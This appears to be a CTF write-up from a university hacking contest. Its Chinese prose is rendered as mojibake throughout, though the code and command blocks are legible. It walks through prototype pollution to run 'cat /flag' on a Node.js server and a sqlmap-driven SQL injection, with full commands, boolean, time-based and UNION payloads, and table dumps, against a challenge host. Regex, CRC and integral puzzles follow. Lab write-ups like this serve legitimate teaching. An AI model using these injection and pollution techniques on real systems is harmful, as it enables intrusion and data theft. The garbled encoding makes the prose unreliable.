æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠâ€œZ:/theflagâ€åœ¨UTF-8ä¸‹è½¬æ¢ä¸ºHEXï¼š

![](images/672f1db3d29ded1a8c49b16e.png)

ç„¶åæŠŠå¾—åˆ°çš„HEXåé¢åŠ ä¸Š`00XX`ä»¥éš”æ–­charã€‚XXéšä¾¿å¡«ï¼Œæœ€å¥½æ˜¯èƒ½è§£å‡ºæ¥ä¸ªå¯è§å­—ç¬¦ã€‚å†æŠŠå¤„ç†å¥½çš„HEXåœ¨UTF16-LEä¸‹è½¬æ¢å›æ¥ï¼š

![](images/672f1e45d29ded1a8c4a492f.png)

æŠŠè§£å‡ºæ¥çš„å†…å®¹è¾“å…¥è¿›å»å°±èƒ½æ‹¿åˆ°flagäº†ã€‚

# PowerfulShell

![](images/672f1ea2d29ded1a8c4a9c56.png)

æ„Ÿå…´è¶£å¯çœ‹å®˜æ–¹é¢˜è§£ã€‚

# Node.JS is Web Scale

![](images/672f1f0ad29ded1a8c4b01e8.png)

æ‰“å¼€åæ˜¯ä¸€ä¸ªNode.JS KV Storeã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‹¿åˆ°`/flag`ã€‚

æ‰“å¼€ä¸‹é¢çš„View source codeçœ‹ä¸€ä¸‹æºä»£ç ï¼š

```javascript
let cmds = {
  getsource: "cat server.js",
  test: "echo 'hello, world!'",
};

// GET /execute - Run commands which are constant and obviously safe.
app.get("/execute", (req, res) => {
  const key = req.query.cmd;
  const cmd = cmds[key];
  res.setHeader("content-type", "text/plain");
  res.send(execSync(cmd).toString());
});
```

å¯ä»¥é€šè¿‡æ‰§è¡Œ/execute?cmd={key}ï¼Œä»¥æ‰§è¡Œåœ¨cmdsä¸­å­˜å‚¨çš„å‘½ä»¤ã€‚ç”±äºcmdsæ˜¯`constant`ï¼Œæ•…è¯¥é¢˜ç›®è®¤ä¸ºæ‰§è¡ŒæŒ‡ä»¤çš„routeæ˜¯`obviously safe`ã€‚

but at what cost?

åœ¨Javascriptä¸­ï¼Œ`__proto__`æ˜¯å¯¹è±¡çš„åŸå‹ï¼Œåªè¦æœ‰å¯¹è±¡éƒ½æœ‰`__proto__`ï¼Œä¸”å¯¹è±¡ç»§æ‰¿`__proto__`çš„å±æ€§å’Œæ–¹æ³•ã€‚å½“ä½ åˆ›å»ºä¸¤ä¸ªå¯¹è±¡æ—¶ï¼Œå®ƒä»¬éƒ½ä¼šæœ‰ä¸€ä¸ªå†…éƒ¨å‚æ•°`[[Prototype]]`ï¼Œä¸”å¯¹äºä»¥å­—é¢å½¢å¼åˆ›å»ºçš„ä¸¤ä¸ªæ™®é€šå¯¹è±¡ï¼Œå®ƒä»¬çš„åŸå‹éƒ½æ˜¯`Object.prototype`ã€‚å› æ­¤ï¼Œå‡å¦‚æœ‰ä¸¤ä¸ªå¯¹è±¡ï¼š

```javascript
let a = {'foo': 'bar'};
let b = {'foo': 'baz'};
```

å½“ä½ ä¿®æ”¹bçš„åŸå‹ä¸­çš„å±æ€§æ—¶ï¼š

```javascript
b.__proto__.bar = 'foo';
```

å®é™…ä¿®æ”¹çš„æ˜¯å®ƒä»¬å…±æœ‰çš„åŸå‹ä¸Šçš„barå±æ€§ã€‚å½“ä½ è¯•å›¾è¯»å–a.baræ—¶ï¼Œç”±äºaæ²¡æœ‰barå±æ€§ï¼Œå®ƒä¾¿ä¼šæ²¿ç€ç»§æ‰¿é“¾å‘åŸå‹å¯»æ‰¾barï¼Œä»è€Œè·å¾—è¢«bæ·»åŠ çš„barå±æ€§ï¼š

```javascript
console.log(a.bar); // è¾“å‡º: 'foo'; å®é™…ä¸ºa.__proto__.bar
```

æ•…æ€è·¯å·²éå¸¸æ¸…æ™°ï¼šæˆ‘ä»¬åªéœ€è¦å‘é¡µé¢æä¾›çš„é”®å€¼å¯¹çš„åŸå‹æ’å…¥æ¶æ„ä»£ç ï¼Œå³å¯è®¿é—®åˆ°`/flag`ã€‚

![](images/672f248ad29ded1a8c50b3aa.png)

è®¿é—®`/execute?cmd=evil`å³å¯æ‰§è¡Œ`cat /flag`ã€‚

![](images/672f24bcd29ded1a8c50f948.png)

# PaoluGPT

## çª¥è§†æœªçŸ¥

ä¸ºä»€ä¹ˆå…ˆå†™ç¬¬äºŒå°é—®ï¼Ÿå› ä¸ºæˆ‘å…ˆåšå‡ºç¬¬äºŒå°é—®ã€‚

ä¸‹è½½é¢˜ç›®é™„ä»¶ï¼Œæ‰“å¼€main.pyï¼Œä¸€çœ¼å¤§å¼€é—¨ï¼š

```python
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```

æœ‰è¿‡æ»¤å—ï¼Ÿ

```python
# database.py
import sqlite3

def execute_query(s: str, fetch_all: bool = False):
    conn = sqlite3.connect("file:/tmp/data.db?mode=ro", uri=True)
    cur = conn.cursor()
    res = cur.execute(s)
    if fetch_all:
        return res.fetchall()
    else:
        return res.fetchone()
```

![](images/672f262ad29ded1a8c52c81c.png)

å“¥ä»¬ï¼ï¼ï¼ˆåŸå­åæ¯ï¼‰ä¸Šsqlmapï¼Œå¹²ä»–ï¼

æŠ“åŒ…ï¼

```
curl 'https://chal01-q45kxsw2.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=76c4d252-ddad-48cf-ae64-3b0dd5f973db' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: _ga=GA1.1.1498233831.1719196175; _ga_Q8WSZQS8E1=GS1.1.1730476974.5.0.1730476982.52.0.1779972184; _ga_R7BPZT6779=GS1.1.1731134815.10.1.1731135175.60.0.794122736; session=YuShengJun' \
  -H 'DNT: 1' \
  -H 'Pragma: no-cache' \
  -H 'Referer: https://chal01-q45kxsw2.hack-challenge.lug.ustc.edu.cn:8443/list' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"'
```

ä¸Šmapï¼

```
sqlmap -u 'https://chal01-q45kxsw2.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=76c4d252-ddad-48cf-ae64-3b0dd5f973db' \
  --headers="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
  --headers="Accept-Language: zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7" \
  --headers="Cache-Control: no-cache" \
  --headers="Connection: keep-alive" \
  --headers="DNT: 1" \
  --headers="Pragma: no-cache" \
  --headers="Referer: https://chal01-q45kxsw2.hack-challenge.lug.ustc.edu.cn:8443/list" \
  --headers="Sec-Fetch-Dest: document" \
  --headers="Sec-Fetch-Mode: navigate" \
  --headers="Sec-Fetch-Site: same-origin" \
  --headers="Sec-Fetch-User: ?1" \
  --headers="Upgrade-Insecure-Requests: 1" \
  --headers="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" \
  --headers="sec-ch-ua: \"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"" \
  --headers="sec-ch-ua-mobile: ?0" \
  --headers="sec-ch-ua-platform: \"Linux\"" \
  --cookie="_ga=GA1.1.1498233831.1719196175; _ga_Q8WSZQS8E1=GS1.1.1730476974.5.0.1730476982.52.0.1779972184; _ga_R7BPZT6779=GS1.1.1731134815.10.1.1731135175.60.0.794122736; session=YuShengJun"
```

```
sqlmap identified the following injection point(s) with a total of 55 HTTP(s) requests:
---
Parameter: conversation_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: conversation_id=76c4d252-ddad-48cf-ae64-3b0dd5f973db' AND 9576=9576 AND 'VVao'='VVao

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: conversation_id=76c4d252-ddad-48cf-ae64-3b0dd5f973db' AND 9128=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'FxGg'='FxGg

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: conversation_id=-5378' UNION ALL SELECT CHAR(113,122,98,118,113)||CHAR(113,115,89,66,81,112,104,66,119,117,82,65,120,72,110,79,69,82,108,103,71,71,90,114,115,116,76,67,72,112,120,84,81,97,121,122,71,66,118,116)||CHAR(113,106,98,98,113),NULL-- ZaFM
---
[17:54:39] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite

```

å› ä¸ºè¿™ä¸ªé¢˜ç›®ä½¿ç”¨çš„æ•°æ®åº“æ˜¯SQLiteï¼Œæ˜¯è„±ä¸å‡ºåº“åçš„ï¼Œæˆ‘ä»¬ç›´æ¥è„±è¡¨

```
$ ... --tables
[17:57:12] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[1 table]
+----------+
| messages |
+----------+
```

è„±å­—æ®µ

```
$ ... -T 'messages' --columns
[17:58:33] [INFO] fetching columns for table 'messages' 
Database: <current>
Table: messages
[4 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| contents | text    |
| id       | text    |
| shown    | boolean |
| title    | text    |
+----------+---------+
```

å‘ç°æœ‰shownå­—æ®µã€‚é‚£å°±è‚¯å®šæœ‰å±•ç¤ºçš„å’Œæ²¡å±•ç¤ºçš„ã€‚æŠŠshownå’Œidè¿å¸¦ç€è„±ä¸‹æ¥ï¼š

```
$ ... -T 'messages' -C 'id,shown' --dump
[18:00:57] [INFO] table 'SQLite_masterdb.messages' dumped to CSV file '/path/to/messages.csv'
```

å“¥ä»¬ï¼ï¼ï¼åº“è„±ä¸‹æ¥äº†ï¼ï¼æŸ¥æ•°æ®ï¼

![](images/672f3354d29ded1a8c614714.png)

è®¿é—®`/view?conversation_id=cb30e667-1ba7-4863-a9c9-8773dfaac619`ï¼Œæ‹‰åˆ°é¡µé¢æœ€åº•éƒ¨å³å¯è·å¾—flagã€‚

![](images/672f33d1d29ded1a8c61db83.png)

## åƒé‡ŒæŒ‘ä¸€

> å° Q çœ‹ç€è¿™äº›èŠå¤©è®°å½•ï¼Œçªç„¶å‘ç°é‡Œé¢å¥½åƒæœ‰ flagâ€¦â€¦

é‚£å°±è—åœ¨å‰©ä¸‹çš„èŠå¤©è®°å½•é‡Œã€‚ç›´æ¥å†™çˆ¬è™«å¼€çˆ¬ã€‚

```python
import pandas as pd
import requests

# CSVæ–‡ä»¶è·¯å¾„
csv_file_path = '/path/to/messages.csv'

# ç›®æ ‡URLçš„åŸºç¡€éƒ¨åˆ†
base_url = 'https://chal01-q45kxsw2.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id='

# HTTPå¤´éƒ¨ä¿¡æ¯
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Cookie': '_ga=GA1.1.1498233831.1719196175; _ga_Q8WSZQS8E1=GS1.1.1730476974.5.0.1730476982.52.0.1779972184; _ga_R7BPZT6779=GS1.1.1731134815.10.1.1731135175.60.0.794122736; session=YuShengJun',
    'DNT': '1',
    'Host': 'chal01-q45kxsw2.hack-challenge.lug.ustc.edu.cn:8443',
    'Pragma': 'no-cache',
    'Referer': 'https://chal01-q45kxsw2.hack-challenge.lug.ustc.edu.cn:8443/list',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"'
}

# è¯»å–CSVæ–‡ä»¶
df = pd.read_csv(csv_file_path)

# æ£€æŸ¥æ¯ä¸ªID
for index, row in df.iterrows():
    conversation_id = str(row['id'])
    url = base_url + conversation_id
    response = requests.get(url, headers=headers)
    
    # æ£€æŸ¥å“åº”ä¸­æ˜¯å¦åŒ…å«ä»¥flag{å¼€å¤´ï¼Œä»¥}ç»“å°¾çš„å­—ç¬¦ä¸²
    if 'flag{' in response.text and '}' in response.text:
        flag_start = response.text.find('flag{')
        flag_end = response.text.find('}', flag_start)
        flag = response.text[flag_start:flag_end+1]
        print(f'Found flag for ID {conversation_id}: {flag}')
```

```
[Running] python -u "/home/elvinstarry/Documents/go/src/tempCodeRunnerFile.python"
Found flag for ID d3c4ad84-2404-401a-8e4e-df71804956a9: flag{zU1_xiA0_de_11m_Pa0lule!!!_YuShengJun}
Found flag for ID cb30e667-1ba7-4863-a9c9-8773dfaac619: flag{enJ0y_y0uR_Sq1_&amp;_1_would_xiaZHOU_hUI_guo_YuShengJun}

[Done] exited with code=null in 124.08 seconds
```

ç»“æŸã€‚

# å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼

å‰é¢çš„é¢˜ç›®å¥½ç©å—ï¼Ÿæ˜¯ä¸æ˜¯æ„Ÿè§‰CTFä¹Ÿå¾ˆç®€å•ï¼Ÿ

é‚£ä¹ˆï¼Œè¦å¼€å§‹äº†å“Ÿ~

> ç»ˆäºåœ¨ä¸€ä¸ªä¸çœ å¤œï¼Œå° Q ä¸€å£æ°”çœ‹å®Œäº†æ­£åˆ™è¡¨è¾¾å¼çš„æ•™ç¨‹ã€‚å“ˆï¼ŸåŸæ¥è¿™ä¹ˆç®€å•ï¼Ÿå° Q å¹¶ä¸¤åˆ†é’Ÿå†™å®Œäº†è‡ªæµ‹é¢˜ç›®ï¼Œçœ‹ç€æ•™ç¨‹å‰©ä¸‹çš„ç›®å½•ï¼Œã€Œåˆ†ç»„ã€ã€ã€Œè´ªå©ªã€ã€ã€Œå‰ç»ã€ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¹Ÿä¸è¿‡å¦‚æ­¤å˜›ï¼Œä»–å¿ƒæƒ³ï¼Œä¹Ÿå°±åšä¸€äº›é‚®ç®±åŒ¹é…ä¹‹ç±»çš„ç®€å•ä»»åŠ¡ç½¢äº†ã€‚
>
> æ­£å½“ä»–è¿˜æ²‰æµ¸åœ¨ã€Œä¸è¿‡å¦‚æ­¤ã€çš„å¹»æƒ³ä¸­ï¼Œä»–åˆ·åˆ°äº†é‚£ä¸ªå…³äºæ­£åˆ™è¡¨è¾¾å¼çš„å¤è€è€Œåˆç¥ç§˜çš„ä¼ è¯´ï¼š
>
> ã€Œæ­£åˆ™è¡¨è¾¾å¼å¯ä»¥ç”¨æ¥è®¡ç®—å–æ¨¡å’Œ CRC æ ¡éªŒâ€¦â€¦ã€

æˆ‘è‰ï¼Œæˆ‘æ€ä¹ˆæ²¡åˆ·åˆ°è¿‡ã€‚

åˆ«æ…Œï¼Œçœ‹ä¸€çœ¼é¢˜ç›®åˆ†ç±»ï¼šmathã€‚å“ˆå“ˆã€‚

## Easy

```python
for i in range(num_tests):
    expected_result = (i % 2 == 0)
    while True:
        t = random.randint(0, 2**64)  # random number for testing
        if difficulty == 1:
            test_string = str(t)  # decimal
            if (t % 16 == 0) == expected_result:  # mod 16
                break
    regex_result = bool(regex.fullmatch(test_string))
    if regex_result == expected_result:
        print("Pass", test_string, regex_result, expected_result)
```

éœ€è¦æˆ‘ä»¬é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ‰€æœ‰å–æ¨¡16ä¸º0çš„æ•°ã€‚è¢«16æ•´é™¤çš„æ•°çš„ç‰¹å¾å¾ˆç®€å•ï¼šæ•°çš„åå››ä½å¯è¢«16æ•´é™¤ã€‚ä½†æ˜¯æ€ä¹ˆç”¨æ­£åˆ™è¡¨ç¤ºå‘¢ï¼Ÿ

```python
max_len = 1000000
```

å—¯ï¼Ÿ

ç›´æ¥åŒ¹é…æ‰€æœ‰æœ«4ä½æ˜¯16çš„å€æ•°çš„æ•°å­—å°±è¡Œäº†ã€‚åªä¸è¿‡ä¼šå¾ˆé•¿ã€‚ä½¿ç”¨pythonç”Ÿæˆï¼š

```python
# ç”Ÿæˆæ‰€æœ‰4ä½æ•°ä»¥å†…çš„16çš„å€æ•°ï¼Œä¸è¶³4ä½å‘å‰è¡¥0
multiples_of_16 = [f'{i:04d}' for i in range(16, 10000, 16)]

output = '(' + '|'.join(multiples_of_16) + ')'
print(output)
```

ç»“å°¾æœ‰äº†ï¼Œä½†æ˜¯æ³¨æ„åˆ°

```python
allowed_chars = "0123456789()|*"
```

æˆ‘ä»¬éœ€è¦ä¸€äº›å¥‡æŠ€æ·«å·§æ‰èƒ½åŒ¹é…ä¸Šå‰é¢æ‰€æœ‰çš„æ•°å­—ï¼Œä»è€Œä½¿`re.fullmatch()`ä¸º`True`ã€‚æ³¨æ„åˆ°å¾…åŒ¹é…å­—ç¬¦ä¸²å…¨ä¸ºæ•°å­—ï¼Œæ‰€ä»¥

```
(0|1|2|3|4|5|6|7|8|9)*
```

å³å¯åŒ¹é…æ‰€æœ‰æ•°å­—ã€‚

æ•…å®Œæ•´è¡¨è¾¾å¼ä¸ºï¼š

```
(0|1|2|3|4|5|6|7|8|9)*(0016|0032|0048|0064|0080|0096|0112|0128|......)
```

å³å¯è·å¾—flagã€‚

> æ³¨æ„åˆ°å®˜æ–¹writeupé‡Œæœ‰è¿™ä¹ˆä¸€å¥è¯ï¼šä¸¥æ ¼æ¥è¯´è¿˜è¦è€ƒè™‘ä¸è¶³å››ä½çš„æƒ…å†µï¼Œä½†æ˜¯æµ‹è¯•æ•°æ®é‡Œé¢å‡ºç°è¿™ç§æƒ…å†µçš„æ¦‚ç‡å¾ˆå°ï¼Œå¿½ç•¥æ‰ä¹Ÿæ˜¯é€šè¿‡çš„ã€‚
>
> ```python
> t = random.randint(0, 2**64)
> ```
>
> èƒ½ä»2^64é‡Œéšæœºå‡ºå°äºå››ä½çš„æ•°ï¼Œæœ‰è¿™è¿æ°”è¿˜ä¸å¦‚å¯åŠ¨æ˜æ—¥æ–¹èˆŸæ¥ä¸€å‘648ã€‚

## Medium

```python
for i in range(num_tests):
    expected_result = (i % 2 == 0)
    while True:
        t = random.randint(0, 2**64)  # random number for testing
        # ...
        elif difficulty == 2:
            test_string = bin(t)[2:]  # binary
            if (t % 13 == 0) == expected_result:  # mod 13
                break
# ...
```

éœ€è¦æˆ‘ä»¬å¯¹ä¸€æ®µäºŒè¿›åˆ¶å­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…ã€‚è¿™æ®µäºŒè¿›åˆ¶å¯¹åº”çš„åè¿›åˆ¶æ•°å­—çš„å–æ¨¡13ä¸º0ã€‚å¯ä»¥æ„é€ ä¸€ä¸ªDFAå®ç°è¿™ä¸€ç‚¹ï¼š

- çŠ¶æ€é›†åˆæ˜¯$Q = \{0, 1, 2, ..., 12\}$ï¼Œä»£è¡¨é™¤ä»¥13çš„æ‰€æœ‰ä½™æ•°

- å­—æ¯è¡¨æ˜¯$\sum = \{0, 1\}$ï¼Œå³äºŒè¿›åˆ¶æ•°å­—

- è½¬ç§»å‡½æ•° 
  $$
  \delta(q,0) = (2q) \mod{13} \\
  \delta(q,1) = (2q+1) \mod{13}
  $$

- åˆå§‹çŠ¶æ€ä¸º$q_0 = 0$ï¼›æ¥å—çŠ¶æ€$F = \{0\}$ï¼Œä»£è¡¨å¯è¢«13æ•´é™¤ã€‚

ç„¶åä½¿ç”¨çŠ¶æ€æ¶ˆé™¤æ³•ç”Ÿæˆæ­£åˆ™è¡¨è¾¾å¼å³å¯ã€‚

ä½†æ˜¯æˆ‘ä¸å–œæ¬¢é€ è½®å­ï¼Œç»è¿‡ä¸€ç•ªå¯»æ‰¾ï¼Œåœ¨å¤–ç½‘æ‰¾åˆ°äº†ä¸€ä½å¤§ä½¬åœ¨2007å¹´å‘çš„ä¸€ç¯‡åšå®¢ï¼Œç»™å‡ºäº†ä½¿ç”¨DFAå’ŒçŠ¶æ€æ¶ˆé™¤æ³•è¾¾åˆ°ä¸Šè¿°ç›®çš„çš„Haskellä»£ç ã€‚ä¸è¿‡2007å¹´çš„ä»£ç åˆ°ç°åœ¨å·²æœ‰å…¼å®¹é—®é¢˜ï¼Œåšä¸€äº›ä¿®æ”¹åæ­£å¸¸è¿è¡Œäº†ã€‚ä¿®æ”¹åçš„ä»£ç å·²ä¸Šä¼ åˆ°Glot.IO Snippetï¼šhttps://glot.io/snippets/h1mudpsx58

![](images/672f47c7d29ded1a8c77775d.png)

ä½¿ç”¨ç”Ÿæˆçš„æ­£åˆ™è¡¨è¾¾å¼æäº¤å³è·å¾—Flag 2ã€‚

# æƒœå­—å¦‚é‡‘ 3.0

## A

è´´å…¥Visual Studio Codeï¼Œå¯¹ç€æ£€æŸ¥å‡ºæ¥çš„é—®é¢˜ä¸€ä¸ªä¸ªæ”¹å›å»å³å¯ã€‚

## B

é™¤äº†åƒAä¸€æ ·è¿˜åŸå‡ºä»£ç å¤–ï¼Œæˆ‘ä»¬è¿˜æ³¨æ„åˆ°ä»£ç ç¬¬7è¡Œçš„CRCå¤šé¡¹å¼å·²è¢«æƒœå­—å¦‚é‡‘åŒ–ï¼š

```python
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = 'B', 48 
    assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'B' 
    flip = sum(['b', 'B'].index(poly[i + 1]) << i for i in range(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in range(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 else 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xdbeEaed4cF43, 0xFDFECeBdeeD9, 0xB7E85A4E5Dcd                 
    assert (u2, u1, u0) == (241818181881667, 279270832074457, 202208575380941)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'little')                                   
```

å¯¹äºCRCå¤šé¡¹å¼çš„é€†æ¨å·²æœ‰ç°æˆå·¥ç¨‹ï¼šhttps://reveng.sourceforge.io/ï¼Œç°åœ¨ä»åœ¨æ´»è·ƒæ›´æ–°ã€‚ä½†å¯¹äºhashå‡½æ•°çš„é€†æ¨ï¼Œæ³¨æ„åˆ°ï¼š
$$
\rm{digest} = (crc \times (crc \times u2 + u1) + u0 ) \mod{(2^{48})}
$$
è¦ä»$$\rm{digest}$$å›æº¯åˆ°$$\rm{crc}$$ï¼Œæˆ‘ä»¬éœ€è¦è§£è¿™ä¸ªæ¨¡$$2^{48}$$ä¸‹çš„ä¸€å…ƒäºŒæ¬¡åŒä½™æ–¹ç¨‹ã€‚ä½†ç”±äº$$2^{48}$$è¿‡äºåºå¤§ï¼Œè§£ä¸Šè¿°æ–¹ç¨‹è¾ƒä¸ºå›°éš¾ï¼Œä¸”å¯èƒ½æœ‰å¤šè§£ï¼Œæˆ‘æ²¡åšå‡ºæ¥ï¼ˆ

åç»ç¾¤å†…æŒç®¡æƒœå­—å¦‚é‡‘çš„ç¥ä»‹ç»ï¼ŒWolfram Cloudå¯ä»¥æä¾›ç®—åŠ›ã€‚ä»¥åè¯•è¯•ã€‚

å¯¹æ­¤é¢˜æœ‰å…´è¶£çš„å¯ä»¥çœ‹çœ‹å®˜æ–¹writeupã€‚

# ä¼˜é›…çš„ä¸ç­‰å¼

## Easy

>æ³¨æ„åŠ›æƒŠäºº

> ä½ éœ€è¦ç”¨ä¼˜é›…çš„æ–¹å¼æ¥è¯æ˜ $$\pi$$å¤§äºç­‰äºä¸€ä¸ªæœ‰ç†æ•°$$\frac{p}{q}$$ã€‚
>
> å…·ä½“æ¥è¯´å°±æ˜¯åªä½¿ç”¨**æ•´æ•°**å’Œ**åŠ å‡ä¹˜é™¤å¹‚è¿ç®—**æ„é€ ä¸€ä¸ªç®€å•å‡½æ•°$$f(x)$$ï¼Œä½¿å¾—è¿™ä¸ªå‡½æ•°åœ¨[0,1]åŒºé—´ä¸Šå–å€¼å‡å¤§äºç­‰äº 0ï¼Œå¹¶ä¸” $$f(x)$$ åœ¨ [0,1] åŒºé—´ä¸Šçš„å®šç§¯åˆ†ï¼ˆæ˜¾ç„¶å¤§äºç­‰äº 0ï¼‰åˆšå¥½ç­‰äº $$\pi-\frac{p}{q}$$ã€‚
>
> ç»™å®šé¢˜ç›®ï¼ˆè¯æ˜  $$\pi-\frac{p}{q}$$ï¼‰ï¼Œä½ æäº¤çš„è¯æ˜åªéœ€è¦åŒ…å«å‡½æ•°$$f(x)$$ã€‚
>
> - è¦ä¼˜é›…ï¼šå‡½æ•°å­—ç¬¦ä¸²æœ‰é•¿åº¦é™åˆ¶ï¼Œ
> - è¦æ˜¾ç„¶ï¼šSymPy èƒ½å¤Ÿ**å¿«é€Ÿ**è®¡ç®—è¿™ä¸ªå‡½æ•°çš„å®šç§¯åˆ†ï¼Œå¹¶éªŒè¯[0,1]ä¸Šçš„éè´Ÿæ€§ã€‚
>
> æ³¨ï¼šè§£å†³è¿™é“é¢˜ä¸éœ€è¦ä½¿ç”¨å•†ä¸šè½¯ä»¶ï¼Œåªä½¿ç”¨ SymPy ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚

å¯¹äºéš¾åº¦0ï¼ŒéªŒè¯å™¨å†…å·²ç»™å‡ºç¤ºä¾‹è§£ç­”ï¼š`4*((1-x**2)**(1/2)-(1-x))`ï¼Œå³
$$
4\sqrt{(1-x^2)}-(1-x)
$$
å¯¹äºéš¾åº¦1ï¼Œæˆ‘ä»¬éœ€è¦ç»™å‡ºçš„$$f(x)$$åœ¨[0,1]éè´Ÿï¼Œä¸”å®šç§¯åˆ†æ°å¥½ç­‰äº$$\pi-\frac{8}{3}$$ã€‚

æ³¨æ„åˆ°$$y = 4\sqrt{(1-x^2)}$$ä¸­$$x \in [0,1]ï¼Œy > 0$$ï¼Œæ•…å®ƒæè¿°äº†ä¸€ä¸ªå•ä½åœ†$$x^2+y^2=1$$åœ¨ç¬¬ä¸€è±¡é™çš„éƒ¨åˆ†ã€‚æ‰€ä»¥
$$
\begin{align}
\int_{0}^{1} 4\sqrt{(1-x^2)} dx &= 4\int_{0}^{1}\sqrt{(1-x^2)}dx \\
&= 4\times\frac{\pi}{4} \\
&= \pi
\end{align}
$$
å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç±»æ¯”éš¾åº¦0çš„è§£æ³•ï¼Œè®¾$$f(x) = g(x) - h(x)$$ã€‚å·²çŸ¥å¯ä»¥ä»¤$$g(x) = 4\sqrt{(1-x^2)}$$ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªh(x)ï¼Œä½¿å…¶åœ¨[0,1]çš„å®šç§¯åˆ†ä¸º$$\frac{8}{3}$$ï¼Œä¸”ä¿è¯$$f(x)$$éè´Ÿã€‚æ³¨æ„åˆ°
$$
\begin{align}
\frac{8}{3} = 4\times\frac{2}{3} &= 4\times(1-\frac{1^3}{3}) \\
&= 4\int_{0}^{1}(1-x^2)dx
\end{align}
$$
æ•…æ„å»º$$f(x)=4\sqrt{(1-x^2)}-4(1-x^2)$$ï¼Œå³`4*(1-x**2)**(1/2)-4*(1-x**2)`ï¼Œå…¶åœ¨[0,1]å®šç§¯åˆ†å³ä¸º$$\pi-\frac{8}{3}$$ã€‚éè´Ÿæ€§è¯æ˜ç•¥ã€‚

![](images/672f5535d29ded1a8c874927.png)

# Docker for Everyone Plus

> æä¾›çš„ç¯å¢ƒä¼šè‡ªåŠ¨ç™»å½•ä½æƒé™çš„ `user` ç”¨æˆ·ã€‚ç™»å½•åå¯ä»¥é€šè¿‡ç‰¹å®šçš„ `sudo docker` å‘½ä»¤ä½¿ç”¨ Dockerï¼Œé€šè¿‡ `sudo -l` å¯ä»¥æŸ¥çœ‹å…è®¸ææƒæ‰§è¡Œçš„å‘½ä»¤ã€‚è¯»å– `/flag`ï¼ˆæ³¨æ„å…¶ä¸ºè½¯é“¾æ¥ï¼‰è·å– flagã€‚æä¾›çš„ç¯å¢ƒä¸­æœ‰ `rz` å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ ZMODEM æ¥æ”¶æ–‡ä»¶ã€‚

